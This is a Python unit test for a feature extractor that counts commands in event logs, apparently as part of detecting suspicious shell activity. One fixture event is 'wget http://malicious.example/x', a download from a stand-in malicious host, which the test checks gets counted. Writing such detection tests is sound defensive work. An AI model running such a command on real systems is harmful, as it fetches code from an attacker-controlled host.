# tests/test_feature_extractor.py
from src.feature_extractor import extract_features

def test_extract_features_wget_and_commands():
    events = [
        {"ts": 1, "text": "ls -la"},
        {"ts": 2, "text": "wget http://malicious.example/x"},
        {"ts": 3, "text": "whoami"}
    ]
    feats = extract_features(events)
    assert isinstance(feats, dict)
    assert feats.get("wget") == 1
    assert feats.get("num_commands") == 3